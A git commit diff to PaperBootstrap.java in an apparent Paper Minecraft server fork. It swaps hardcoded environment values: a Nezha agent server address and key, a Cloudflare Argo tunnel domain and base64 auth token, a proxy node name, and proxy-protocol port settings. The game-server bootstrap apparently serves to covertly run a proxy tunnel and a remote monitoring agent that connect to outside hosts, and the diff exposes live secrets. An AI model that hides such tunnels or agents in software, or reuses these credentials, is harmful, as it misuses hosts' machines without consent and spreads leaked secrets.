78c5cefae2e564c035cb819305894d7c00d287b8
yaoqufeng <78394060+yaoqufeng@users.noreply.github.com>
2025-11-26 10:40:12 +0800

    Update PaperBootstrap.java

--- paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
+++ paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
@@ -92,14 +92,14 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "19066bb5-8d3a-4a29-8592-6ddbdd27e8a0");
+        envVars.put("UUID", "fad74ea7-ae7c-41d9-afc2-5bdf3e9ae64a");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "ip.086571.xyz:8008");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "YiSBm5Hzzl9AadRQjLcHymN2WoZTR6hk");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "satx-ru.gpt.us.kg");
-        envVars.put("ARGO_AUTH", "eyJhIjoiNTdhZDk5Y2U4MDQ2MTg2ZGEyZWI1ZTQ3YjVmODlhNDMiLCJ0IjoiZGEyMzU2YjQtMjAyYy00NzJkLWJhMzQtOGQyYTA5Nzk2ZjFmIiwicyI6Ik9UQXpOMlkxWkRndFlqbGhOeTAwTXpSaExXRXpNR1F0TURKa056azROR1ZoTW1WaSJ9");
+        envVars.put("ARGO_DOMAIN", "hostopia-bg.gpt.us.kg");
+        envVars.put("ARGO_AUTH", "eyJhIjoiNTdhZDk5Y2U4MDQ2MTg2ZGEyZWI1ZTQ3YjVmODlhNDMiLCJ0IjoiZjI4NTI2NzUtMzk2My00MGU1LWIxMWItZWY5MzhiZmFmNGE3IiwicyI6Ik4ySXdOalk0T0RRdFptWmpaQzAwTnpJMUxUazBPRGN0T1dRMk5HTmhOMkkwTlRsbCJ9");
         envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
@@ -108,7 +108,7 @@ public final class PaperBootstrap {
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "cf.877774.xyz");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "Satx");
+        envVars.put("NAME", "Hostopia");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
